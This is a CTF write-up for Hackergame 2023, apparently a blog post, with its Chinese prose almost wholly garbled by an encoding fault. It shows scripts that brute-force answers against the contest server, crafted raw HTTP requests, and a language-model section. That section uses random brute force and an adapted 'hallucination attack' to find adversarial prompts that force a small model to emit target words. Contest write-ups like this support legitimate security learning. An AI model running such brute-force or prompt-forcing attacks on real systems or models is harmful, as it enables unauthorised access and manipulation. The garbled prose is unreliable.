# Hackergame 2023 Writeups

å»å¹´æˆ‘è¢«Hackergameçš„é­…åŠ›æ‰€å¸å¼•ï¼Œå› æ­¤æ‰å¼€å§‹æ¶‰è¶³CTFçš„ä¸–ç•Œã€‚ä»Šå¹´æˆ‘é¦–æ¬¡è¸ä¸Šäº†å‚èµ›ä¹‹æ—…ï¼Œå°½ç®¡è§£é¢˜è¿‡ç¨‹ä¸­é­é‡äº†è¯¸å¤šæŒ‘æˆ˜ï¼Œä½†æ­£æ˜¯è¿™äº›æŒ‘æˆ˜æå¤§åœ°ä¸°å¯Œäº†æˆ‘çš„çŸ¥è¯†ï¼Œè®©æˆ‘æ”¶è·äº†è®¸å¤šæ—¢æ·±åˆ»åˆæœ‰è¶£çš„æŠ€æœ¯æ´è§ã€‚

> é¡ºä¾¿ä¸€æï¼Œæ¬¢è¿å…‰ä¸´æˆ‘çš„åšå®¢ï¼š[https://blog.vvbbnn00.cn/](https://blog.vvbbnn00.cn/)ï¼ˆè™½ç„¶æœ€è¿‘ä¸å¤ªæ›´æ–°ï¼‰

## çŒ«å’ªé—®ç­”

1ã€åœ¨ä¸­ç§‘å¤§å›¾ä¹¦é¦†ç½‘ç«™æ‰¾åˆ°è¿™æœ¬ä¹¦ï¼Œç„¶åæŸ¥è¯¢å¯¹åº”æ¥¼å±‚å³å¯
![a9a2824666063dcc4b6ca6291ea0a4a5.png](_resources/a9a2824666063dcc4b6ca6291ea0a4a5.png)

![b0a294e6fc120bf885e33a2cab63188b.png](_resources/b0a294e6fc120bf885e33a2cab63188b.png)

ç­”æ¡ˆæ˜¯12æ¥¼

2ã€æœç´¢`Chicken`å°±èƒ½æ‰¾åˆ°
![321322141f934008ec30e6e0ab3e1825.png](_resources/321322141f934008ec30e6e0ab3e1825.png)
![a720b8351a7648fb7f77e1c68b5639d9.png](_resources/a720b8351a7648fb7f77e1c68b5639d9.png)

ç­”æ¡ˆæ˜¯23

3ã€Githubæ‰¾bbrä»“åº“å³å¯
![1f734f49297f527efd3fa7ad92f7152a.png](_resources/1f734f49297f527efd3fa7ad92f7152a.png)

ç­”æ¡ˆæ˜¯CONFIG_TCP_CONG_BBR

4ã€è°·æ­Œä¼˜åŠ¿åŒºé—´

![3f2ada710743b200f73a6ac7f5da6b70.png](_resources/3f2ada710743b200f73a6ac7f5da6b70.png)

æœåˆ°ç›¸å…³è®ºæ–‡
![626aae4d3380dac8b1e86298a6ea2304.png](_resources/626aae4d3380dac8b1e86298a6ea2304.png)

ç­”æ¡ˆæ˜¯ECOOP

`flag{r3A1-M@$t3r-oF-thE-NekO-eXAm-1n-U$TC}`


## æ›´æ·±æ›´æš—

ç›´æ¥æŸ¥çœ‹æºä»£ç ï¼Œæœç´¢flagå³å¯

![8aaeb7e19fa6af87bd3f9e69ad02f177.png](_resources/8aaeb7e19fa6af87bd3f9e69ad02f177.png)

`flag{T1t@n_d23fabdd64a692f9db0dba162c40433c}`

## æ—…è¡Œç…§ç‰‡ 3.0

### ç¥ç§˜å¥–ç‰Œ
è¿™æ˜¯ä¸€ä¸ªè¯ºè´å°”å¥–ç« ï¼Œå¾—ä¸»æ˜¯å°æŸ´æ˜Œä¿Šï¼ŒæŸ¥è¯¢ä¸ªäººå±¥å†ï¼š
![accfbc941b73e4fc7c8efb09153e4593.png](_resources/accfbc941b73e4fc7c8efb09153e4593.png)
å¯çŸ¥ï¼Œæ‰€å±å¤§å­¦ä¸ºæ˜æ²»å¤§å­¦ã€ä¸œäº¬å¤§å­¦å’Œä¸œæµ·å¤§å­¦ã€‚

ç”±äºä½œè€…å»çš„æ˜¯æ—¥æœ¬ï¼Œä¸å­¦é•¿åœ¨ä¸Šé‡å…¬å›­é™„è¿‘çš„å‚è§‚å°±é¤ï¼Œæ‰€ä»¥ï¼Œå­¦æ ¡ä¸€å®šåœ¨ä¸œäº¬éƒ½å¸‚åœˆã€‚
ä¸å·§çš„æ˜¯ï¼Œè¿™ä¸‰æ‰€å¤§å­¦éƒ½åœ¨ä¸œäº¬ã€‚ä¸è¿‡ï¼Œç¦»ä¸Šé‡å…¬å›­æœ€è¿‘çš„å°±æ˜¯ä¸œäº¬å¤§å­¦äº†ã€‚
![1d6c5f4e9cbbd1ae06d0b8f57a02f760.png](_resources/1d6c5f4e9cbbd1ae06d0b8f57a02f760.png)

æ‰€ä»¥ï¼Œè‡ªç„¶çŒœæƒ³ï¼Œå±•è§ˆçš„è¯ºè´å°”å¥–ç« è‚¯å®šæ˜¯ä¸œäº¬å¤§å­¦ç ”ç©¶è€…çš„ã€‚
![7ea311fc77d9c9987ce1e4027ce14295.png](_resources/7ea311fc77d9c9987ce1e4027ce14295.png)

ä¾æ¬¡æŸ¥è¯¢ä¸€éï¼Œå¾—åˆ°å‡ºç”Ÿæœ€æ™šçš„ä¸ºï¼šæ¢¶ç”° éš†ç« 

è·å¥–æ—¶æ‰€åœ¨æœºæ„ï¼šICRR
![6f91b1853ad6398704ef99a4aa07bd48.png](_resources/6f91b1853ad6398704ef99a4aa07bd48.png)

è‡³äºæ˜¯å‡ å·å’Œå­¦é•¿è§é¢çš„ï¼Œæˆ‘æ€ä¹ˆçŸ¥é“ğŸ˜…ï¼Œåªèƒ½çˆ†ç ´ä¸€ä¸‹äº†ã€‚
```python
import base64

import requests

if __name__ == '__main__':
    for m in range(7, 9):
        for d in range(1, 32):
            url = "http://202.38.93.111:12345/"

            raw = f"Answer1=2023-{str(m).zfill(2)}-{str(d).zfill(2)}&Answer2=ICRR"

            payload = f"{base64.b64encode(raw.encode()).decode()}.txt"
            headers = {
                'Accept': '*/*',
                'Accept-Language': 'en,zh-CN;q=0.9,zh;q=0.8,en-GB;q=0.7,en-US;q=0.6,zh-TW;q=0.5',
                'Cache-Control': 'no-cache',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Cookie': 'session=...',
                'DNT': '1',
                'Origin': 'http://202.38.93.111:12345',
                'Pragma': 'no-cache',
                'Proxy-Connection': 'keep-alive',
                'Referer': 'http://202.38.93.111:12345/',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.69',
                'X-Requested-With': 'XMLHttpRequest'
            }

            response = requests.request("POST", url, headers=headers, data=payload)

            if "flag" in response.text:
                print(response.text, raw)
                break
```

çˆ†ç ´å‡ºæ¥çš„æ—¥æœŸæ˜¯2023-08-10 ~~ï¼ˆä¸è¿‡è¿™ä¸ªæ—¶é—´ï¼Œæ¯”èµ·çœ‹å­¦é•¿ï¼Œä¸æ›´åº”è¯¥å»å¹²åˆ«çš„å—ï¼Ÿï¼‰~~

`flag{how_I_wi5h_i_COulD_w1N_A_Nobe1_pri23_50abaae64b}`


### è¿™æ˜¯ä»€ä¹ˆæ´»åŠ¨ï¼Ÿ

~~æ€»ä¸èƒ½æ˜¯é‡å…½é‚¸åœ£åœ°å·¡ç¤¼æ´»åŠ¨å§~~

ä¸Šé‡å…¬å›­é™„è¿‘æœ‰å¾ˆå¤šåšç‰©é¦†ï¼Œä¸è¿‡ä½œä¸ºå¤–å›½è§‚å…‰å®¢ï¼Œæœ€å…ˆæƒ³å»çš„åº”è¯¥æ˜¯è¿™ä¸¤ä¸ªåšç‰©é¦†å§ï¼š
![d6e151d81f472e82a3c6c04949e0c4d6.png](_resources/d6e151d81f472e82a3c6c04949e0c4d6.png)
![6702a4a9bf05fde3e7f52266d56aaed2.png](_resources/6702a4a9bf05fde3e7f52266d56aaed2.png)

å›½ç«‹åšç‰©é¦†ï¼Œæˆ‘å»çš„æ—¶å€™ï¼Œå‡ºç¤ºå›½å†…çš„å­¦ç”Ÿè¯ï¼Œè´¹ç”¨æ˜¯500å††ï¼Œä¸è¿‡ä¸€èˆ¬è§‚å…‰å®¢æ˜¯1000å††ï¼Œè¿™é‡Œå…ˆä¿ç•™ç­”æ¡ˆã€‚

è¥¿æ´‹ç¾æœ¯é¦†ï¼Œæˆ‘å»çš„æ—¶å€™ï¼Œæ­£å¥½æœ‰ç‰¹åˆ«å±•å‡ºï¼Œç¿»æ‰¾äº†ä¸€ä¸‹é—¨ç¥¨ï¼Œå¤§å­¦ç”Ÿæ˜¯1300å††ï¼Œåˆæœç´¢äº†ä¸€ä¸‹å¸¸è®¾é¦†ï¼Œç¥¨ä»·æ˜¯500æˆ–250å††

è‡³äº8æœˆ10æ—¥æœ‰ä»€ä¹ˆæ´»åŠ¨ï¼Œæˆ‘æ‰¾äº†åŠå¤©ï¼Œæ‰¾åˆ°äº†å¦‚ä¸‹æµ·æŠ¥ï¼š
![8838fc39c997e743cbde24beb392400e.png](_resources/8838fc39c997e743cbde24beb392400e.png)

å¿—æ„¿è€…ç›¸å…³é€šçŸ¥ï¼Œæœç´¢`æ¢…é…’ã¾ã¤ã‚Š ãƒœãƒ©ãƒ³ãƒ†ã‚£ã‚¢`å°±æ‰¾åˆ°äº†ï¼šhttps://umeshu-matsuri.jp/tokyostaff/

S495584522

è¿™ä¸ª100äº¿%ç¡®å®šæ˜¯å¯¹çš„äº†ï¼Œä½†æ˜¯ç¥¨ä»·ä¸å¯¹ï¼Œä¼¼ä¹è¿™ä¸¤ä¸ªé¦†éƒ½æ²¡å»ï¼Ÿå¥¶å¥¶æ»´ï¼Œä¸æ‰¾äº†ï¼Œç»§ç»­çˆ†ç ´

éš¾ä»¥ç½®ä¿¡ï¼Œæˆ‘è¯•äº†10åˆ°5000æ—¥å…ƒçš„æ•´æ•°ï¼Œéƒ½æ²¡æœ‰æ‰¾åˆ°æ­£ç¡®çš„ç¥¨ä»·ï¼ŒçœŸç¦»è°±å•Šã€‚

0å…ƒæ˜¯å§ï¼ŒçœŸæœ‰ä½ çš„

`flag{PluM_w1NE_1S_rEa1LY_EXpen5iVE_ddcf7d6c60}`


### åä¼šæœ‰æœŸï¼Œå­¦é•¿ï¼

æ¨ç‰¹æœç´¢`ãƒœã‚¿ãƒ³ ã‚«ãƒ•ãƒªãƒ³ã‚¯ã‚¹`ï¼Œç¬¬ä¸€ä¸ªå°±æ˜¯
![116a72fca8e990c08e625c133cf276f5.png](_resources/116a72fca8e990c08e625c133cf276f5.png)

3Dçš„å°åŠ¨ç‰©ï¼ŒåŒæ ·æœç´¢ä¸€ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°è¿™ä¸ªpdfï¼š
![b131f3c401ef8b78aa99cdb07b3dd989.png](_resources/b131f3c401ef8b78aa99cdb07b3dd989.png)

ä¸è¿‡è¿™ä¸ªæ ‡ç‰Œç›´åˆ°22å¹´éƒ½æ²¡å»ºæˆï¼Œå¤§æ¦‚æ˜¯æœ€è¿‘æ–°å»ºçš„ã€‚
![fd46602d7cc8e4e7924bf0654631147a.png](_resources/fd46602d7cc8e4e7924bf0654631147a.png)

11.01æ—¥å‘ç°30æ—¥æ›´æ–°çš„æ–°é—»ï¼šhttps://universal-ooh.jeki.co.jp/column/0056/

![0e950503308291eb4ace8490a3cce503.png](_resources/0e950503308291eb4ace8490a3cce503.png)

æ‰€ä»¥æ˜¯`å¤§ç†ŠçŒ«`ï¼ˆä½†æ˜¯å¹¶ä¸æ˜¯ï¼Œæœ€åè¯•å‡ºæ¥æ˜¯`ç§‹ç”°çŠ¬`ï¼‰


ä½†æ˜¯å­¦é•¿åˆ°åº•å»å“ªé‡Œäº†å‘¢ï¼ŸğŸ˜…

ä»å­¦é•¿è„–å­ä¸Šçš„æŒ‚ç»³å¯ä»¥çœ‹åˆ°`statphys`ï¼Œæœç´¢æ‰¾åˆ°æ´»åŠ¨é¡µé¢ï¼šhttps://statphys28.org/banquet.html

åœ¨banqueté‡Œé¢ï¼Œå¯ä»¥çœ‹åˆ°æ¸¸èˆ¹æ´»åŠ¨å®‰æ’https://statphys28.org/banquet.html

![6f3a3b6ac04ff026de83e15574085bae.png](_resources/6f3a3b6ac04ff026de83e15574085bae.png)

æ‰€ä»¥æ˜¯`å®‰ç”°è®²å ‚`


`flag{Un7I1_W3_M337_A64iN_6oODByE_S3n1OR_cde92331bf}`


## èµ›åšäº•å­—æ£‹

ä¾æ¬¡è¯·æ±‚
```json
{"x":"0","y":"0"}
```
```json
{"x":"1","y":"1"}
```
```json
{"x":"2","y":"2"}
```
å³å¯

è¿˜ä»¥ä¸ºè¦ä¼ªé€ `flask session`ï¼Œæ²¡æƒ³åˆ°ä¸‹æ£‹å¯ä»¥ä¸ç”¨éµå®ˆè§„åˆ™ï¼Œä¸è®²æ­¦å¾·å•Šã€‚

**å¦å¤–ä¸€ç§è§£æ³•ï¼š** å‰ç«¯ä¿®æ”¹å‡½æ•°`setMove`ï¼ŒæŠŠé™åˆ¶æ¡ä»¶å»é™¤ï¼Œè¦†ç›–åŸå‡½æ•°ï¼Œä¸‹æ£‹å³å¯ã€‚

`flag{I_can_eat_your_pieces_9c87f4d46c}`



## ç»„å§”ä¼šæ¨¡æ‹Ÿå™¨

ä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œåœ¨è§£é¢˜æ—¶ï¼Œcookieéœ€è¦æ–°è·å–ä¸€ä¸ªï¼Œä¸èƒ½ç›´æ¥ç”¨æµè§ˆå™¨ä¸­è¯·æ±‚è¿‡`getMessages`çš„cookie

```python
import re
import time
from datetime import datetime

import requests

token = "..."
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.69"
}


def checkToken():
    url = "http://202.38.93.111:10021/api/checkToken"
    response = requests.request("GET",
                                url,
                                headers=headers,
                                allow_redirects=False,
                                params={
                                    "token": token
                                })
    headers['Cookie'] = f"session={response.cookies['session']}"


def getMessages():
    url = "http://202.38.93.111:10021/api/getMessages"

    payload = {}

    response = requests.request("POST", url, headers=headers, data=payload)

    return response.json()


def getFlag():
    url = "http://202.38.93.111:10021/api/getflag"
    response = requests.request("POST", url, headers=headers)
    print(response.json())


def deleteMessage(msgId):
    print(msgId)
    url = "http://202.38.93.111:10021/api/deleteMessage"
    payload = {
        "id": msgId
    }
    response = requests.request("POST", url, headers=headers, json=payload)
    print(response.json())


if __name__ == '__main__':
    checkToken()
    print(headers)
    testData = getMessages()
    server_starttime = testData['server_starttime']  # 2023-10-28T06:28:04.017795+00:00
    start_ts = datetime.strptime(server_starttime, "%Y-%m-%dT%H:%M:%S.%f+00:00").timestamp() + 8 * 3600

    for i, x in enumerate(testData['messages']):
        text = x['text']
        # æ£€æµ‹åŒ…å«hack[xxx]çš„æ¶ˆæ¯ï¼Œæ–¹æ‹¬å·å†…å‡ä¸ºå°å†™è‹±æ–‡å­—æ¯
        regex = re.compile(r'hack\[([a-z]+)\]')
        if regex.findall(text):
            delay = x['delay'] + start_ts
            delta = delay - time.time()
            print(x['delay'], delay, time.time(), delta)
            if delta > 0:
                time.sleep(delta + 0.5)
            deleteMessage(i)
    time.sleep(5)
    getFlag()


```

`flag{Web_pr0gra_mm1ng_da82fe5cdc_15fun}`


## å¥¶å¥¶çš„ç¡å‰ flag æ•…äº‹

è°·æ­Œæˆªå›¾æ¼æ´ï¼Œhttps://acropalypse.app/

![529499a6912a71d79ba919a41da9ba74.png](_resources/529499a6912a71d79ba919a41da9ba74.png)

`flag{sh1nj1ru_k0k0r0_4nata_m4h0}`


## è™«
ä¸€çœ¼SSTV
![e5ad5e36c378c6350fabede8b64a26dd.png](_resources/e5ad5e36c378c6350fabede8b64a26dd.png)

`flag{SSssTV_y0u_W4NNa_HaV3_4_trY}`

## Git? Git!

å¯¹.gitæ–‡ä»¶å¤¹é‡Œçš„æ¯ä¸€ä¸ªæ–‡ä»¶éƒ½inflateä¸€ä¸‹ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰flagå°±è¡Œäº†
![433d3ec9449f76076231994c47672869.png](_resources/433d3ec9449f76076231994c47672869.png)
![837660bdbff038167192164a4840d13b.png](_resources/837660bdbff038167192164a4840d13b.png)

`flag{TheRe5_@lwAy5_a_R3GreT_pi1l_1n_G1t}`

## JSON âŠ‚ YAML?
### ç¬¬ä¸€é—®
æœç´¢ä¸€ä¸‹ï¼Œå¾ˆå¿«èƒ½æ‰¾åˆ°è¿™ç¯‡æ–‡ç« ï¼š
https://stackoverflow.com/questions/21584985/what-valid-json-files-are-not-valid-yaml-1-1-files

æ„é€ ï¼š{"aa": 12345e999 }

```text
Input your JSON: {"aa": 12345e999 }
As JSON: {'aa': inf}
As YAML 1.1: {'aa': '12345e999'}
Flag1: flag{faf9facd7c9d64f74a4a746468400a50f0b3cd1fcf}
```

### ç¬¬äºŒé—®

è¯•ç€è¯•ç€è¯•å‡ºæ¥çš„ï¼ˆ
```json
{"a":"1","a":2}
```


`flag{b1c73f14d04db546b7e7e24cf1cc7252afb88726e1}`


## HTTP é›†é‚®å†Œ

5ç§ï¼š`flag{stacking_up_http_status_codes_is_fun_fce6328eeb}`
æ— çŠ¶æ€ç ï¼š`flag{congratu1ations you discovered someth1ng before http1.0}`

å¤§éƒ¨åˆ†çŠ¶æ€ç éƒ½å¯ä»¥è·Ÿç€mdnæ‰‹å†Œæ¥å®ç°ï¼Œæ­¤å¤„çœç•¥200,404,405è¿™ç§å¤ªç®€å•çš„

### 400
å‘é€æ— æ•ˆå†…å®¹

### 414
å‘é€å¾ˆé•¿çš„è·¯å¾„è¯·æ±‚

### 505
æä¾›é”™è¯¯çš„HTTPç‰ˆæœ¬

### 100
```
GET / HTTP/1.1\r\n
Host: 111\r\n
Expect: 100-continue\r\n\r\n
```

### 206
```
GET /50x.html HTTP/1.1\r\n
Host: example.com\r\n
Range: bytes=100-200\r\n
\r\n
```

### 406
```
GET /50x.html HTTP/1.1\r\n
Host: example.com\r\n
Range: bytes=a\r\n
\r\n
```

### 412
```
GET /50x.html HTTP/1.1\r\n
Host: example.com\r\n
If-Match: "67ab43", "54ed21", "7892dd"\r\n
\r\n
```

### 304
```
GET /50x.html HTTP/1.1\r\n
Host: example.com\r\n
If-None-Match: *\r\n
\r\n
```


### 413

æ²¡æƒ³åˆ°ç¡äº†ä¸€è§‰ä»¥åï¼Œè¿™ä¹ˆå®¹æ˜“å°±è¯•å‡ºæ¥äº†ï¼ˆæ˜¨æ™šæƒ³çš„å¤´éƒ½ç‚¸äº†ï¼Œå¤§æ¦‚æ˜¯å› ä¸ºä¹‹å‰é•¿åº¦è®¾ç½®å¤ªé•¿ï¼Œå˜æˆ400é”™è¯¯äº†ï¼‰

```
GET / HTTP/1.1\r\n
Host: example.com\r\n
Content-Length: 1145141919810\r\n
\r\n
```


### æ— çŠ¶æ€ç 
```
GET / \r\n  HTTP/1.1\r\n
Host: 111\r\n
\r\n
```




## ğŸª å°å‹å¤§è¯­è¨€æ¨¡å‹æ˜Ÿçƒ

### You Are Smart
ä¸‹è½½è®­ç»ƒé›†ï¼šhttps://huggingface.co/datasets/roneneldan/TinyStories/tree/main

æœç´¢ï¼š![152febd1270e58f28c936c9187222249.png](_resources/152febd1270e58f28c936c9187222249.png)

æŠŠå‰é¢ä¸€æ®µè¯æ”¾è¿›å»ï¼Œæ¨¡å‹ä¾¿ä¼šæŒ‰ç…§è®­ç»ƒé›†å†…å®¹å®Œå–„
![9ed6f4324e93306fe487802d242c9ae3.png](_resources/9ed6f4324e93306fe487802d242c9ae3.png)

`flag{I-thinK-Y0u-4Re-Re411Y-R3a11y-5MARt} `


### Accepted

> è®©æˆ‘è¯´å‡º accepted æˆ‘ä¼šé€ç»™ä½  flag2ï¼Œ**æ¶ˆæ¯é•¿åº¦ä¸è¶…è¿‡7**...

çœ‹åˆ°è¿™ä¸ªè¦æ±‚åï¼Œæˆ‘æ‹¿å‡ºäº†æˆ‘çš„3080Tiã€‚

æ—¢ç„¶æ²¡æœ‰ä»€ä¹ˆå¥½åŠæ³•ï¼Œé‚£å°±ç›´æ¥æš´åŠ›å¥½äº†ã€‚è¯´ä¸å®šç»•è¿œè·¯ä¹Ÿæ˜¯ä¸€ç§èµ°æ·å¾„ã€‚

```python
import gradio as gr
import torch
from tqdm import tqdm
from transformers import AutoModelForCausalLM, AutoTokenizer

# Check if CUDA is available and set the device to GPU if it is
device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
print("Using device:", device)

model = AutoModelForCausalLM.from_pretrained("roneneldan/TinyStories-33M").eval()
tokenizer = AutoTokenizer.from_pretrained("roneneldan/TinyStories-33M")

# Move the model to the appropriate device (either GPU or CPU)
model.to(device)


def predict(message):
    model_inputs = tokenizer.encode(message, return_tensors="pt")

    # Move model input tensor to the appropriate device
    model_inputs = model_inputs.to(device)

    model_outputs = model.generate(
        model_inputs,
        max_new_tokens=30,
        num_beams=1,
        pad_token_id=tokenizer.eos_token_id,
    )
    model_outputs = model_outputs[0, len(model_inputs[0]):]
    model_output_text = tokenizer.decode(model_outputs, skip_special_tokens=True)
    return model_output_text


if __name__ == "__main__":
    # demo.queue(concurrency_count=16).launch(show_api=False, share=False)
    # ç”Ÿæˆé•¿åº¦1-7çš„éšæœºå­—ç¬¦ä¸²
    import random
    import string

    counter = 0

    while True:
        length = random.randint(1, 7)
        # bytes from 1 to 255
        s = ""
        for i in range(length):
            n = random.randint(1, 255)
            s += chr(n)
        answer = predict(s)
        counter += 1
        if counter % 100 == 0:
            print(counter, s, answer)
        if "accepted" in answer:
            print(s, answer)
            break

```


è¿è¡Œç»“æœ
```text
Using device: cuda
100  . He was so happy to have found it. He thanked the bird and went back home with his new treasure.

200 Â‰Ã¡ ing the poem. It's about the sun and the stars and the moon. It's about having fun and learning. Do you want to try it
300  . He was so happy to have found it. He thanked the bird and went back home with his new treasure.

400 Â…Ã„aÂ“T ruck! Panda and Pee are friends. They like to play together.

One day, Peepee and Peeee were playing in
500 Âˆ&T laailail!â€

Her mom smiled and said, â€œThatâ€™s right, Kayla. Itâ€™s a
600 Ã•*rÃ¯Â§  was so excited! He wanted to show everyone how cool he was.

So he grabbed his bag and started running. He ran so fast that
700 Ãœ{Â—P\C oco is a very intelligent baby. You can do anything you set your mind to!â€

Polly smiled and said, â€œI
800 dÃ¥yÂ  slog!

900 Â«Â¬Ã­nÂ¾ icatedka!â€

The little girl was so excited. She thanked her mom and ran off to play with her new toy.

1000 Â™ s so excited to learn something new!

1100 0Â‡Ã€ orBanfish!â€

The little girl was so excited. She had never seen anything so beautiful. She thanked the fisherman and ran home
1200 Ã­Â«ÂT ina said, "I want to buy a new toy."

Her mom said, "Order? What does that mean?"

Tina
1300 t8Ã™Ã¿Ã®@ . He was so proud of himself. He had used his clearest toes to get the trophy.

1400 ÃÂ½Ã”u.  Everyone in the village was excited.

The next day, the Pantsoch was gone. Everyone was sad.

But then, something special
1500 AÃ˜Â¹Ã¬8 ED!â€™

Her mom laughed and said, â€œNo Monkey Monkey, you canâ€™t have a CIR Slim. You
1600 Â“isÃªO me and a banana peel," Lily said.

Mom smiled and said, "That's right, Lily. You are very smart and curious.
1700 ÂºÃ²Â¬& ite! He had found a new friend who was deaf too.

1800 VÃ½ .â€

The little girl was so excited. She thanked the fairy and ran off to show her friends.

1900 Â˜Â¨Â• â€™.â€

The little girl was so excited. She said, â€œI want to learn how to swim like you!ï¿½
2000 Ã ÂŠÃ­DÃ’  said, â€œLetâ€™s go and find some bananas.â€

So they went to the jungle and found lots of bananas.
2100 ÂdÂ¾Ã‡Ã±~Ã˜ YARpt Rabbit!

The barber was so happy to see his pure joy. He gave the comb back to the little girl and she
2200 Ã“Ãˆ^Zd(  Sail" written on the lid.

2300 ?Â† 

2400 Ã¢ Ã¢â‚¬â„¢".

The little girl was very scared and started to cry. She said, "I'm sorry, I didn't mean to
2500 Â‹Â«M9aÂ Â¿YÂ¿Y/uam

2600 Ã˜Ã©Ã‡ ï¿½. He was very proud of his work.

One day, the teacher said it was time to go to the university. Everyone was excited
2700 ÂÃ„ or questions about the universe. He wanted to learn more about it.

One day, his teacher asked him to read a book. He was
2800 Ã¿3Â° Frog!"

The frog was very happy. He thanked the frog and went back to his pond.

The end.

2900 3Â˜/Ã . He has learned a new language.

"Wow, you are a smart scientist!" Lily says. "You can make anything you want.
3000 Â¡Â·Â¸ÃÂÃ¤L enaenaenaenaenaenaenaenaenaenaenaenaenaenaenaenaenaenaenaenaenaenaenaenaenaenaenaenaenaena
3100 Â†Ã¹ÃšÂ†  Diary!â€

Her mom smiled and said, â€œYes, thatâ€™s right. Now, letâ€™s go and
3200 |Ã†9  was a good designer. He wanted to make something special.

He went to the kitchen and found some flour, sugar, and eggs. He
ZÂ©Â‘Ã®}  accepted LabelAP! She was so happy that she hugged Label tightly. From then on, Label was always the one who said Label Bookhelos were

```

æœ€åè·‘å‡ºæ¥çš„Promptï¼š`ZÂ©Â‘Ã®} (hex=\x5a\xa9\x91\xee\x7d)`

![5f6d4077953e4b9791210227abdbe198.png](_resources/5f6d4077953e4b9791210227abdbe198.png)

`flag{yoU-Are-4CcePtEd-t0-c0nTinue-THE-g4me}`


###  ğŸ®

è€ƒè™‘åˆ°æ²¡æ³•åƒä¹‹å‰é‚£æ ·æŠ•æœºå–å·§ï¼Œä¾¿å¿…åº”äº†ä¸€ä¸‹ï¼Œå‘ç°æœ‰ä¸€ç§å«åš`å¹»è§‰æ”»å‡»`çš„ä¸œè¥¿ï¼Œè€Œä¸”æœ‰å¼€æºä»£ç ï¼šhttps://github.com/PKU-YuanGroup/Hallucination-Attack

äºæ˜¯å°è¯•å¯¹å…¶è¿›è¡Œäº†ç•¥å¾®çš„é­”æ”¹ï¼ˆå®é™…ä¸Šä¹Ÿå°±æ˜¯åŠ ä¸€ä¸‹configå’Œembeddingä¹‹ç±»çš„ç®€å•æ“ä½œï¼‰ï¼Œç„¶åå°±å¼€å§‹è®­ç»ƒã€‚

é¦–å…ˆæˆ‘å¯¹hackergameè¿›è¡Œäº†å°è¯•ï¼Œè·‘æ˜¯è·‘å‡ºæ¥äº†ï¼Œä½†æ˜¯é•¿åº¦å¤ªé•¿äº†ã€‚å¯æƒœæˆ‘å®Œå…¨ä¸æ‡‚æœºå™¨å­¦ä¹ ï¼Œæ‰€ä»¥æ ¹æœ¬ä¸çŸ¥é“æ€ä¹ˆè°ƒä¼˜ï¼ˆ

æ‰€ä»¥æœ€åå…ˆè·‘å‡ºæ¥çš„æ˜¯ ğŸ®ï¼ˆç”šè‡³è¿˜æ˜¯`ğŸ®!`ï¼‰

```
nationalE formingdreamUL flaming yea sc bathroomEEP proficient hidingMonarsh microscopic unresolved regularsFlorida crawled Bes strawberry hidesâ€¦.
```

![bd36f1e2473c3f6470b5e0cb2c918eb8.png](_resources/bd36f1e2473c3f6470b5e0cb2c918eb8.png)

![c095587106f022e3b281c4130c0c55d7.png](_resources/c095587106f022e3b281c4130c0c55d7.png)


`flag{HOw-dO-1-saY-4n-EmoJ1-i-Have-nEv3R-5EEN-befor3}`


### hackergame

è™½ç„¶å®åœ¨æä¸æ˜ç™½æœºå™¨å­¦ä¹ ï¼Œä½†è‡³å°‘ä¸Šå­¦æœŸå­¦è¿‡æœºå™¨å­¦ä¹ çš„è¯¾ï¼Œå¥½æ­¹èƒ½ç¡¬ç€å¤´çš®æä¸€ç‚¹ï¼ˆ

ç”±äºé™åˆ¶äº†é•¿åº¦ï¼Œæ‰€ä»¥åœ¨ç”Ÿæˆæ—¶ï¼Œæœ€å¤§çš„ä¿®æ”¹æ˜¯åœ¨æ¯ä¸€æ¬¡forwardä¹‹åï¼Œæ‰§è¡Œä¸€ä¸ªæ£€æŸ¥è¾“å…¥è¯é•¿åº¦çš„å‡½æ•°ã€‚è‹¥é•¿åº¦å¤ªé•¿ï¼Œåˆ™æ ¹æ®è¶…å‡ºçš„é•¿åº¦å¢åŠ lossï¼Œä»è€Œè¯±å¯¼æ¨¡å‹ç”Ÿæˆè¾ƒçŸ­çš„è¾“å…¥è¯ã€‚

```python
    def limit_input_length(self):
        """Adjust the loss based on the length of temp_input and limit its length if needed."""
        if len(self.temp_input) > self.max_input_length:
            excess_length = len(self.temp_input) - self.max_input_length
            self.temp_loss += excess_length * self.temp_loss  # or some other function of excess_length
            # self.temp_input = self.temp_input[:self.max_input_length]  # truncate to fit within max_input_length

```

é€”ä¸­å®é™…ä¸ŠæˆåŠŸå‡ºç°äº†å¥½å‡ æ¬¡`hackergame`ï¼Œå¯æƒœé•¿åº¦å¤ªé•¿ï¼Œèˆä¹‹ã€‚
![46efd87509384d87d38d938409e36acb.png](_resources/46efd87509384d87d38d938409e36acb.png)

å¥½åœ¨æœ€ç»ˆæˆåŠŸç”Ÿæˆäº†ï¼
![bd04e1cbe00e3a23bb292ac01a877b4b.png](_resources/bd04e1cbe00e3a23bb292ac01a877b4b.png)

```
lass traumatic Alive mayor gamePrim Today raw kickedoch bookletãŸ 200 Non hide recommendedml DRFakeiz
```

![73b1adcbc7ffe35ae3d3d15f4f171986.png](_resources/73b1adcbc7ffe35ae3d3d15f4f171986.png)

`flag{i-c@NNO7-B3!!Ev3-1-JU57-s4iD-HAcKerGame}`


## æƒœå­—å¦‚é‡‘ 2.0

æ²¡å¿…è¦æŠŠæ‰€æœ‰è¢«åˆ é™¤çš„å­—éƒ½æ‰¾å›æ¥ï¼Œåªéœ€è¦æ ¹æ®å¼€å¤´çš„`flag{`å’Œæœ«å°¾çš„`}`ï¼Œæ¨æµ‹å‡ºå¤§æ¦‚åˆ åœ¨å“ªé‡Œäº†å°±è¡Œã€‚

```python
#!/usr/bin/python3

# The size of the file may reduce after XZRJification

def check_equals(left, right):
    # check whether left == right or not
    if left != right: exit(1)


def get_code_dict():
    # prepare the code dict
    code_dict = []

    # yå›ºå®šï¼ŒçŒœæµ‹}eä¹‹åï¼Œcc / hh / tt / te
